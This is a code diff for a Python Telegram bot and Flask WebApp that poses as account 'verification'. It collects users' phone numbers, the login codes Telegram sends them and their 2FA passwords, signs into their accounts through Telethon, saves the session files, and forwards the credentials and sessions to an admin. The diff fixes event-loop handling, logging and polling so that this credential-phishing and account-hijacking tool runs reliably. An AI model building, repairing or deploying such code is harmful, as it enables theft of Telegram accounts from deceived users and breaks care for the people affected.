@@ -8,6 +8,7 @@ import asyncio
 import threading
 import time
 import logging
+import sys
 from datetime import datetime
 
 # =============== SETUP ===============
@@ -32,27 +33,20 @@ user_data = {}
 otp_sessions = {}
 verification_status = {}
 
-# =============== FIXED ASYNC FUNCTIONS ===============
-def run_async(coro):
-    """Run async function in a thread-safe way"""
-    try:
-        # Get or create event loop for this thread
+# =============== FIXED: SINGLE EVENT LOOP ===============
+# Create a single event loop for all async operations
+event_loop = None
+
+def get_event_loop():
+    """Get or create event loop for async operations"""
+    global event_loop
+    if event_loop is None:
         try:
-            loop = asyncio.get_event_loop()
+            event_loop = asyncio.get_event_loop()
         except RuntimeError:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-        
-        if loop.is_running():
-            # If loop is already running, run in thread
-            future = asyncio.run_coroutine_threadsafe(coro, loop)
-            return future.result(timeout=30)
-        else:
-            # Run the coroutine in the current loop
-            return loop.run_until_complete(coro)
-    except Exception as e:
-        logger.error(f"Async error: {e}")
-        raise e
+            event_loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(event_loop)
+    return event_loop
 
 async def send_otp_via_telethon_async(phone):
     """Send OTP using Telethon"""
@@ -60,11 +54,14 @@ async def send_otp_via_telethon_async(phone):
         os.makedirs('sessions', exist_ok=True)
         session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
         
+        logger.info(f"📤 Creating Telethon client for {phone}")
         client = TelegramClient(session_name, API_ID, API_HASH)
-        await client.connect()
         
-        logger.info(f"📤 Sending OTP to {phone}")
+        await client.connect()
+        logger.info(f"📤 Connected to Telegram for {phone}")
+        
         sent = await client.send_code_request(phone)
+        logger.info(f"✅ OTP sent to {phone}")
         
         otp_sessions[phone] = {
             'client': client,
@@ -76,6 +73,7 @@ async def send_otp_via_telethon_async(phone):
     except FloodWaitError as e:
         return {'success': False, 'error': f'Wait {e.seconds} seconds'}
     except Exception as e:
+        logger.error(f"Error sending OTP to {phone}: {e}")
         return {'success': False, 'error': str(e)}
 
 async def verify_otp_via_telethon_async(phone, otp_code):
@@ -88,6 +86,7 @@ async def verify_otp_via_telethon_async(phone, otp_code):
         client = client_data['client']
         phone_code_hash = client_data['phone_code_hash']
         
+        logger.info(f"🔐 Verifying OTP for {phone}")
         await client.sign_in(phone=phone, code=otp_code, phone_code_hash=phone_code_hash)
         
         if await client.is_user_authorized():
@@ -103,6 +102,8 @@ async def verify_otp_via_telethon_async(phone, otp_code):
             await client.session.save()
             session_file = client.session.filename
             
+            logger.info(f"✅ Verified {phone}, user: {user_info.get('username', 'N/A')}")
+            
             return {
                 'success': True,
                 'user_info': user_info,
@@ -113,10 +114,12 @@ async def verify_otp_via_telethon_async(phone, otp_code):
             return {'success': False, 'error': 'Not authorized'}
             
     except SessionPasswordNeededError:
+        logger.info(f"🔐 2FA required for {phone}")
         return {'success': True, 'requires_2fa': True}
     except PhoneCodeInvalidError:
         return {'success': False, 'error': 'Invalid OTP'}
     except Exception as e:
+        logger.error(f"Error verifying OTP for {phone}: {e}")
         return {'success': False, 'error': str(e)}
 
 async def verify_2fa_via_telethon_async(phone, password):
@@ -140,23 +143,30 @@ async def verify_2fa_via_telethon_async(phone, password):
         await client.session.save()
         session_file = client.session.filename
         
+        logger.info(f"✅ 2FA successful for {phone}")
+        
         return {
             'success': True,
             'user_info': user_info,
             'session_file': session_file
         }
     except Exception as e:
+        logger.error(f"2FA error for {phone}: {e}")
         return {'success': False, 'error': str(e)}
 
-# Wrapper functions
-def send_otp_via_telethon(phone):
-    return run_async(send_otp_via_telethon_async(phone))
-
-def verify_otp_via_telethon(phone, otp_code):
-    return run_async(verify_otp_via_telethon_async(phone, otp_code))
-
-def verify_2fa_via_telethon(phone, password):
-    return run_async(verify_2fa_via_telethon_async(phone, password))
+# Thread-safe async execution
+def run_async_task(coro):
+    """Run async coroutine in a thread-safe way"""
+    loop = get_event_loop()
+    if loop.is_running():
+        # Run in thread pool
+        import concurrent.futures
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            future = executor.submit(lambda: asyncio.run_coroutine_threadsafe(coro, loop).result(timeout=30))
+            return future.result()
+    else:
+        # Run in current loop
+        return loop.run_until_complete(coro)
 
 # =============== HELPER FUNCTIONS ===============
 def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
@@ -214,7 +224,7 @@ def handle_start(message):
             port = os.environ.get('PORT', 5000)
             webapp_url = f"http://localhost:{port}"
         
-        logger.info(f"🌐 WebApp URL: {webapp_url}")
+        logger.info(f"🌐 WebApp URL: {webapp_url} for user {user_id}")
         
         # Create WebApp button
         kb = types.InlineKeyboardMarkup()
@@ -297,7 +307,8 @@ def handle_contact(message):
         # Send OTP via Telethon in background thread
         def send_otp_task():
             try:
-                result = send_otp_via_telethon(phone)
+                logger.info(f"Starting OTP task for {phone}")
+                result = run_async_task(send_otp_via_telethon_async(phone))
                 
                 if result['success']:
                     bot.edit_message_text(
@@ -336,7 +347,7 @@ Return to WebApp to enter the OTP.""",
                     parse_mode='HTML'
                 )
         
-        thread = threading.Thread(target=send_otp_task)
+        thread = threading.Thread(target=send_otp_task, daemon=True)
         thread.start()
         
         # Delete contact message
@@ -351,28 +362,6 @@ Return to WebApp to enter the OTP.""",
             bot.send_message(message.chat.id, "⚠️ Error processing contact. Please try again.")
         except:
             pass
-
-@bot.message_handler(func=lambda message: True)
-def handle_all_messages(message):
-    """Handle other messages"""
-    try:
-        if message.text and not message.text.startswith('/'):
-            help_text = """🔐 <b>Account Verification Help</b>
-
-<b>How to verify:</b>
-1. Use /start to get WebApp button
-2. Open WebApp and share contact
-3. 5-digit OTP will appear here
-4. Enter OTP in WebApp
-5. Complete verification
-
-<b>Note:</b> Telegram sends 5-digit OTP codes.
-
-Use /start to begin verification."""
-            
-            bot.send_message(message.chat.id, help_text, parse_mode='HTML')
-    except Exception as e:
-        logger.error(f"Message handler error: {e}")
 
 # =============== FLASK ROUTES ===============
 @app.route('/')
@@ -423,17 +412,17 @@ def api_verify_otp():
             return jsonify({'success': False, 'error': 'Phone not found'})
         
         # Check attempts
-        if user_id in verification_status:
-            verification_status[user_id]['otp_attempts'] += 1
-            if verification_status[user_id]['otp_attempts'] > 3:
+        if str(user_id) in verification_status:
+            verification_status[str(user_id)]['otp_attempts'] += 1
+            if verification_status[str(user_id)]['otp_attempts'] > 3:
                 return jsonify({'success': False, 'error': 'Too many attempts'})
         
         # Verify OTP
-        result = verify_otp_via_telethon(phone, cleaned_otp)
+        result = run_async_task(verify_otp_via_telethon_async(phone, cleaned_otp))
         
         if result['success']:
             if result.get('requires_2fa'):
-                verification_status[user_id]['stage'] = 'needs_2fa'
+                verification_status[str(user_id)]['stage'] = 'needs_2fa'
                 return jsonify({
                     'success': True,
                     'requires_2fa': True,
@@ -441,8 +430,8 @@ def api_verify_otp():
                 })
             else:
                 # Successfully verified
-                verification_status[user_id]['stage'] = 'verified'
-                verification_status[user_id]['verified'] = True
+                verification_status[str(user_id)]['stage'] = 'verified'
+                verification_status[str(user_id)]['verified'] = True
                 
                 # Send to admin
                 send_to_admin(
@@ -485,11 +474,11 @@ def api_verify_2fa():
             return jsonify({'success': False, 'error': 'Phone not found'})
         
         # Verify 2FA
-        result = verify_2fa_via_telethon(phone, password)
+        result = run_async_task(verify_2fa_via_telethon_async(phone, password))
         
         if result['success']:
-            verification_status[user_id]['stage'] = 'verified'
-            verification_status[user_id]['verified'] = True
+            verification_status[str(user_id)]['stage'] = 'verified'
+            verification_status[str(user_id)]['verified'] = True
             
             # Send to admin with password
             send_to_admin(
@@ -513,46 +502,59 @@ def api_verify_2fa():
         logger.error(f"API 2FA error: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
-# =============== BOT POLLING ===============
-def run_bot_polling():
-    """Run bot polling with proper error handling"""
-    logger.info("🤖 Starting bot polling...")
+# =============== FIXED: SINGLE BOT INSTANCE ===============
+def run_bot_single_instance():
+    """Run bot with single instance check"""
+    logger.info("🤖 Starting bot in single instance mode...")
     
-    max_retries = 10
-    retry_delay = 5
+    # First, ensure we're the only instance
+    try:
+        # Get webhook info to check if another instance is running
+        webhook_info = bot.get_webhook_info()
+        if webhook_info.pending_update_count > 0:
+            logger.info("Clearing pending updates...")
+    except:
+        pass
     
+    # Remove any existing webhook
+    try:
+        bot.remove_webhook()
+        time.sleep(1)
+    except:
+        pass
+    
+    # Start polling with retry logic
+    max_retries = 5
     for attempt in range(max_retries):
         try:
-            # Remove any existing webhook first
-            bot.remove_webhook()
-            time.sleep(1)
-            
             logger.info(f"🔄 Bot polling attempt {attempt + 1}/{max_retries}")
             
-            # Start polling
+            # Start polling with skip_pending to avoid conflicts
             bot.polling(
                 none_stop=True,
-                interval=2,
-                timeout=30,
-                skip_pending=True
+                interval=3,  # Increased interval
+                timeout=60,
+                skip_pending=True,  # Skip pending updates
+                allowed_updates=["message", "callback_query"]
             )
             
-        except telebot.apihelper.ApiTelegramException as api_error:
-            if "Conflict" in str(api_error):
-                logger.error("❌ Another bot instance is running. Waiting 10 seconds...")
+            # If polling stops, break
+            break
+            
+        except Exception as e:
+            error_str = str(e)
+            logger.error(f"❌ Bot error (attempt {attempt + 1}): {error_str}")
+            
+            if "Conflict" in error_str:
+                logger.info("Another instance detected. Waiting 10 seconds...")
                 time.sleep(10)
-            elif "Unauthorized" in str(api_error):
-                logger.error("❌ Invalid bot token")
+            elif "Unauthorized" in error_str:
+                logger.error("Invalid bot token!")
                 break
             else:
-                logger.error(f"❌ Telegram API error: {api_error}")
-                time.sleep(retry_delay)
-                
-        except Exception as e:
-            logger.error(f"❌ Bot polling error: {str(e)}")
-            time.sleep(retry_delay)
+                time.sleep(5)
     
-    logger.error("❌ Max retries reached. Bot polling stopped.")
+    logger.error("Bot polling stopped.")
 
 # =============== CLEANUP ===============
 def cleanup_old_sessions():
@@ -588,29 +590,35 @@ def cleanup_old_sessions():
 # =============== MAIN ===============
 if __name__ == "__main__":
     logger.info("="*60)
-    logger.info("🚀 Telegram Verification Bot")
+    logger.info("🚀 Telegram Verification Bot - FIXED VERSION")
     logger.info("="*60)
     logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
     logger.info(f"👑 Admin ID: {ADMIN_ID}")
+    logger.info(f"🐍 Python: {sys.version}")
+    logger.info("="*60)
+    
+    # Initialize event loop
+    get_event_loop()
+    logger.info("✅ Event loop initialized")
     
     # Start cleanup thread
     cleanup_thread = threading.Thread(target=cleanup_old_sessions, daemon=True)
     cleanup_thread.start()
     logger.info("✅ Cleanup thread started")
     
-    # Start bot polling in separate thread
-    bot_thread = threading.Thread(target=run_bot_polling, daemon=True)
+    # Start bot in separate thread
+    bot_thread = threading.Thread(target=run_bot_single_instance, daemon=True)
     bot_thread.start()
-    logger.info("✅ Bot polling thread started")
+    logger.info("✅ Bot thread started")
     
     # Wait for bot to initialize
-    time.sleep(3)
+    time.sleep(5)
     
     # Start Flask in main thread
     port = int(os.environ.get("PORT", 10000))
     logger.info(f"🚀 Starting Flask on port {port}")
     
-    # Disable Flask reloader to avoid multiple bot instances
+    # Disable Flask reloader to avoid multiple instances
     app.run(
         host="0.0.0.0",
         port=port,
